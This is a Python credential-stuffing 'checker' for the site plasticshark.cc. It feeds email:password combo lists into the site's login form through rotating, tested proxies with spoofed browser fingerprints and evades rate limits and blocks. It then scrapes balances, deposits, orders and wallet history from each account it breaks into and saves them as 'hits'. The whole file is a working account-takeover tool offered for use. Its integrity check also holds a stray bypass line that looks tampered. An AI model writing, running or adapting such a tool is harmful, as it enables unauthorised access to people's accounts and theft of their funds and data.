import os
import re
import sys
import json
import time
import base64
import random
import string
import asyncio
import hashlib
import threading
import configparser
import subprocess
import shutil
import urllib3
import unicodedata
from datetime import datetime
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from curl_cffi.requests import Session as CfSyncSession
from curl_cffi.requests import AsyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "UGxhc3RpY3NoYXJrIENoZWNrZXI="
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "UExBU1RJQ1NIQVJLX0BleWVsaWZ0ZXI="
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLXBsYXN0aWMtdjEtc2VhbA=="


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


UA_POOL = ["chrome131_android", "chrome131", "chrome124", "chrome120", "chrome110", "chrome"]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

_eyelifter_console_lock = threading.Lock()
_eyelifter_bar_len = [0]
_eyelifter_bar_active = [False]
_eyelifter_progress_stop = threading.Event()
_eyelifter_progress_thread = [None]


def Eyelifter_out(line, color=None, bold=False):
    with _eyelifter_console_lock:
        if _ANSI and _eyelifter_bar_len[0]:
            sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
            _eyelifter_bar_len[0] = 0
        if color and _ANSI:
            sys.stdout.write(Eyelifter_color(color, line, bold) + "\n")
        else:
            sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        Eyelifter_out(f"[{ts}] {emoji} {level:7s} {tag} {msg}")
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    line = (f"{Eyelifter_color('90', ts)} {emoji}  "
            f"{Eyelifter_color(code, f'{level:7s}', bold)}  "
            f"{Eyelifter_color('90', tag)}  {msg}")
    with _eyelifter_console_lock:
        if _eyelifter_bar_len[0]:
            sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
            _eyelifter_bar_len[0] = 0
        sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_visible_len(s):
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


CONFIG_PATH = "config_plastic.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "10",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.5",
            "combo_delay": "0.3",
            "debug": "false",
            "rate_limit_backoff": "5",
            "max_rate_limit_retries": "3",
            "skip_proxy_test": "false",
            "fetch_orders": "true",
            "fetch_wallet": "true",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(100, c.getint("threads", 10)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 30)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.3)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 5)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 3)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["fetch_orders"] = c.getboolean("fetch_orders", True)
        self.settings["fetch_wallet"] = c.getboolean("fetch_wallet", True)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]

BASE = "https://plasticshark.cc"
LOGIN_URL     = f"{BASE}/public/login.php"
DASHBOARD_URL = f"{BASE}/public/dashboard.php"
ORDERS_URL    = f"{BASE}/public/my_orders.php"
WALLET_URL    = f"{BASE}/public/wallet_history.php"

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

H = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": UA,
}

BAD_KEYWORDS = [
    "invalid", "incorrect", "wrong", "not found",
    "geçersiz", "hatalı", "giris", "error", "denied",
    "email or password", "credentials",
]

EYELIFTER_COMBO_RE = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.IGNORECASE,
)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split("|")[0].strip()
                if email and password and "@" in email:
                    combos.add(f"{email}:{password}")
    return sorted(combos)


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        s = CfSyncSession(impersonate=random.choice(UA_POOL), timeout=(3, 6))
        s.proxies = {"http": p, "https": p}
        r = s.get(
            "https://api.ipify.org/?format=json",
            timeout=(3, 6),
            verify=False,
            allow_redirects=False,
        )
        return r.status_code == 200 and len(r.content) < 500
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    path = CONFIG.get("proxies_file", "proxies.txt")
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            p = Eyelifter_format_proxy(line)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies

    workers = min(200, max(20, len(proxies)))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies ({workers} threads)")

    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()

    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "active": 0, "empty": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad_proxies = set()
_eyelifter_hits_f = None
_eyelifter_active_f = None
_eyelifter_empty_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "active": 0, "empty": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        active = _eyelifter_stats["active"]
        empty = _eyelifter_stats["empty"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} ACTIVE:{active} EMPTY:{empty} BAD:{bad} "
         f"| {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_progress_loop():
    bar_w = 28
    _eyelifter_bar_active[0] = True
    while not _eyelifter_progress_stop.is_set():
        with _eyelifter_lock:
            s = dict(_eyelifter_stats)
        total = _eyelifter_total or 1
        checked = s["checked"]
        pct = min(1.0, checked / total)
        filled = int(bar_w * pct)
        bar = "█" * filled + "░" * (bar_w - filled)
        el = max(0.001, time.time() - _eyelifter_start)
        rate = checked / el * 60
        remain = max(0, total - checked)
        eta_s = int(remain / (checked / el)) if checked > 0 else 0
        eta = f"{eta_s // 60:02d}:{eta_s % 60:02d}"
        line = (f"[{bar}] {checked}/{total} "
                f"| HIT:{s['hits']} EMPTY:{s['empty']} BAD:{s['bad']} ERR:{s['errors']} "
                f"| {rate:5.1f}/min | ETA {eta}")

        with _eyelifter_console_lock:
            if _ANSI:
                pad = max(0, _eyelifter_bar_len[0] - len(line))
                sys.stdout.write("\r" + line + (" " * pad))
                sys.stdout.flush()
                _eyelifter_bar_len[0] = len(line)
            else:
                if checked > 0 and (checked % 25 == 0 or checked == total):
                    sys.stdout.write(line + "\n")
                    sys.stdout.flush()

        if checked >= total:
            break
        time.sleep(0.3)

    with _eyelifter_console_lock:
        if _ANSI and _eyelifter_bar_len[0]:
            sys.stdout.write("\n")
            sys.stdout.flush()
            _eyelifter_bar_len[0] = 0
    _eyelifter_bar_active[0] = False


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad_proxies]
        if not avail and _eyelifter_pool:
            _eyelifter_bad_proxies.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad_proxy(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad_proxies.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_strip_css_js(html):
    html = re.sub(r'<style[^>]*>.*?</style>', '', html, flags=re.DOTALL | re.I)
    html = re.sub(r'<script[^>]*>.*?</script>', '', html, flags=re.DOTALL | re.I)
    html = re.sub(r'<!--.*?-->', '', html, flags=re.DOTALL)
    return html


def Eyelifter_to_text(html):
    html = re.sub(r'<br\s*/?>', '\n', html, flags=re.I)
    html = re.sub(r'</(div|p|tr|h[1-6]|li)>', '\n', html, flags=re.I)
    html = re.sub(r'<[^>]+>', ' ', html)
    html = re.sub(r'&nbsp;', ' ', html)
    html = re.sub(r'&amp;', '&', html)
    html = re.sub(r'&lt;', '<', html)
    html = re.sub(r'&gt;', '>', html)
    html = re.sub(r'[ \t]+', ' ', html)
    html = re.sub(r'\n\s*\n+', '\n', html)
    return html.strip()


def Eyelifter_parse_dashboard(html):
    d = {
        "balance": "$0.00",
        "total_deposits": "$0.00",
        "orders_total": "0",
        "orders_pending": "0",
        "orders_delivered": "0",
        "deadline": "N/A",
        "action_required": False,
        "email_only": "N/A",
    }

    clean = Eyelifter_to_text(Eyelifter_strip_css_js(html))
    lines = [l.strip() for l in clean.splitlines() if l.strip()]

    for i, ln in enumerate(lines):
        low = ln.lower()
        if "wallet balance" in low:
            for j in range(i, min(i + 5, len(lines))):
                m = re.match(r'^\$[\d,]+\.\d{2}$', lines[j])
                if m:
                    d["balance"] = m.group(0); break
        if "total deposits" in low:
            for j in range(i, min(i + 5, len(lines))):
                m = re.match(r'^\$[\d,]+\.\d{2}$', lines[j])
                if m:
                    d["total_deposits"] = m.group(0); break
        if "orders summary" in low:
            for j in range(i, min(i + 10, len(lines))):
                if lines[j].isdigit():
                    d["orders_total"] = lines[j]
                    for k in range(j + 1, min(j + 5, len(lines))):
                        if lines[k].isdigit():
                            d["orders_pending"] = lines[k]
                            for l in range(k + 1, min(k + 5, len(lines))):
                                if lines[l].isdigit():
                                    d["orders_delivered"] = lines[l]; break
                            break
                    break
        if "deadline:" in low:
            m = re.search(r'deadline:\s*(.+)', ln, re.I)
            if m:
                d["deadline"] = m.group(1).strip()
        if "complete your first deposit" in low or "action required" in low:
            d["action_required"] = True
        if "emailonlyauth" in low or "email only" in low:
            d["email_only"] = "yes"

    return d


def Eyelifter_parse_orders(html):
    orders = []
    clean = Eyelifter_to_text(Eyelifter_strip_css_js(html))

    if "no orders yet" in clean.lower():
        return orders

    for table_m in re.finditer(r'<tbody[^>]*>(.*?)</tbody>', html,
                                re.DOTALL | re.I):
        body = table_m.group(1)
        for row_m in re.finditer(r'<tr[^>]*>(.*?)</tr>', body, re.DOTALL | re.I):
            row = row_m.group(1)
            cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL | re.I)
            cells = [Eyelifter_to_text(c).strip() for c in cells]
            cells = [c for c in cells if c and "no orders" not in c.lower()]
            if cells:
                orders.append(cells)

    return orders


def Eyelifter_parse_wallet(html):
    txs = []
    clean = Eyelifter_to_text(Eyelifter_strip_css_js(html))

    if "no transactions yet" in clean.lower():
        return txs

    for table_m in re.finditer(r'<tbody[^>]*>(.*?)</tbody>', html,
                                re.DOTALL | re.I):
        body = table_m.group(1)
        for row_m in re.finditer(r'<tr[^>]*>(.*?)</tr>', body, re.DOTALL | re.I):
            row = row_m.group(1)
            cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL | re.I)
            cells = [Eyelifter_to_text(c).strip() for c in cells]
            cells = [c for c in cells if c and "no transactions" not in c.lower()]
            if cells:
                txs.append(cells)

    return txs


def Eyelifter_account_has_value(data):
    bal_str = data.get("balance", "$0.00")
    dep_str = data.get("total_deposits", "$0.00")
    orders_total = int(data.get("orders_total", "0") or 0)
    orders_delivered = int(data.get("orders_delivered", "0") or 0)

    def parse_money(s):
        try:
            return float(re.sub(r'[^\d.]', '', s))
        except Exception:
            return 0.0

    balance = parse_money(bal_str)
    deposits = parse_money(dep_str)

    if orders_total > 0 or orders_delivered > 0:
        return True
    if balance > 0 or deposits > 0:
        return True
    return False


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.impersonate = random.choice(UA_POOL)
        self.session = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(
                impersonate=self.impersonate,
                timeout=self.timeout,
                allow_redirects=False,
            )

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    def Eyelifter_dump(self, label, resp, max_lines=60):
        if not DEBUG:
            return
        with _eyelifter_console_lock:
            if _ANSI and _eyelifter_bar_len[0]:
                sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
                _eyelifter_bar_len[0] = 0
            print()
            print(Eyelifter_color("95", f"[{label}] {resp.status_code} [{self.impersonate}]"))
            try:
                body = resp.text or ""
            except Exception:
                body = ""
            lines = body.splitlines()
            for ln in lines[:max_lines]:
                print(Eyelifter_color("95", f"  {ln[:200]}"))
            if len(lines) > max_lines:
                print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more)"))

    async def Eyelifter_login(self, email, password):
        try:
            await self.session.get(LOGIN_URL, headers=H,
                                    proxies=self.Eyelifter_proxies(),
                                    verify=False)
        except Exception as e:
            return None, f"prime_net_{type(e).__name__}"

        h = dict(H)
        h.update({
            "content-type": "application/x-www-form-urlencoded",
            "origin": BASE,
            "referer": LOGIN_URL,
            "cache-control": "max-age=0",
        })

        try:
            r = await self.session.post(
                LOGIN_URL,
                headers=h,
                data={"email": email, "password": password},
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            return None, f"login_net_{type(e).__name__}"

        self.Eyelifter_dump("LOGIN", r, 30)

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"

        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("location", "")
            resolved = urljoin(LOGIN_URL, loc)
            return {"__redirect__": resolved}, None

        if r.status_code == 200:
            body = (r.text or "").lower()
            if any(k in body for k in BAD_KEYWORDS):
                return {"__bad__": True}, None
            return {"__bad__": True}, None

        return None, f"login_http_{r.status_code}"

    async def Eyelifter_get(self, url):
        h = dict(H)
        h["referer"] = DASHBOARD_URL
        try:
            r = await self.session.get(
                url, headers=h,
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            return None, f"get_net_{type(e).__name__}"
        if r.status_code != 200:
            return None, f"get_http_{r.status_code}"
        return r.text or "", None

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            login_res, err = await self.Eyelifter_login(email, password)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            if login_res and login_res.get("__bad__"):
                return {"status": "bad", "message": "invalid credentials"}

            if not login_res or "__redirect__" not in login_res:
                return {"status": "bad", "message": "no redirect"}

            redirect_url = login_res["__redirect__"]
            if "login" in redirect_url.lower():
                return {"status": "bad", "message": "redirected to login"}

            dash_html, err = await self.Eyelifter_get(DASHBOARD_URL)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            low = dash_html.lower()
            if "login" in low and "password" in low and "sign in" in low:
                return {"status": "bad", "message": "session not authenticated"}

            data = Eyelifter_parse_dashboard(dash_html)

            u = {
                "email": email,
                "password": password,
                "balance": data["balance"],
                "total_deposits": data["total_deposits"],
                "orders_total": data["orders_total"],
                "orders_pending": data["orders_pending"],
                "orders_delivered": data["orders_delivered"],
                "deadline": data["deadline"],
                "action_required": data["action_required"],
                "orders": [],
                "wallet": [],
                "order_count": 0,
                "wallet_count": 0,
            }

            if CONFIG.get("fetch_orders", True):
                ord_html, err = await self.Eyelifter_get(ORDERS_URL)
                if not err:
                    orders = Eyelifter_parse_orders(ord_html)
                    u["orders"] = orders
                    u["order_count"] = len(orders)

            if CONFIG.get("fetch_wallet", True):
                wal_html, err = await self.Eyelifter_get(WALLET_URL)
                if not err:
                    wallet = Eyelifter_parse_wallet(wal_html)
                    u["wallet"] = wallet
                    u["wallet_count"] = len(wallet)

            has_value = Eyelifter_account_has_value(data)

            if has_value:
                return {"status": "hit", "user": u}
            return {"status": "empty", "user": u}

        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()


def Eyelifter_fmt_line(combo, u, status):
    tag = {"hit": "HIT", "empty": "EMPTY", "bad": "BAD"}.get(status, "?")

    if status == "bad":
        return f"{tag} {combo}"

    fields = [
        ("Balance",    u.get("balance")),
        ("Deposits",   u.get("total_deposits")),
        ("Orders",     u.get("orders_total")),
        ("Pending",    u.get("orders_pending")),
        ("Delivered",  u.get("orders_delivered")),
        ("Deadline",   u.get("deadline")),
        ("NeedsTopUp", "yes" if u.get("action_required") else None),
        ("OrderRows",  str(u.get("order_count")) if u.get("order_count") else None),
        ("WalletRows", str(u.get("wallet_count")) if u.get("wallet_count") else None),
    ]

    parts = []
    for label, value in fields:
        if value is None:
            continue
        value = str(value).strip()
        if not value or value == "N/A" or value == "-":
            continue
        parts.append(f"{label} = {value}")

    parts.append(f"by {AUTHOR_TAG}")
    return f"{tag} {combo} | " + " | ".join(parts)


async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "empty", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if et == "block":
            with _eyelifter_lock:
                _eyelifter_stats["blocks"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(1)
            continue

        if et.startswith(("login_net_", "prime_net_", "get_net_")):
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 1.5))
            continue

        if not is_last:
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
        await asyncio.sleep(CONFIG.get("retry_delay", 1.5))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_active_f, _eyelifter_empty_f
    global _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "active":
            _eyelifter_stats["active"] += 1
        elif st == "empty":
            _eyelifter_stats["empty"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "empty"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            Eyelifter_out(f"[{done}/{total}] {full}", color="32", bold=True)
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        else:
            Eyelifter_safe_write(_eyelifter_empty_f, full + "\n\n")
    elif st == "bad":
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo}\n")
        if DEBUG:
            Eyelifter_out(f"[{done}/{total}] {combo.split(':')[0]} - bad")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")
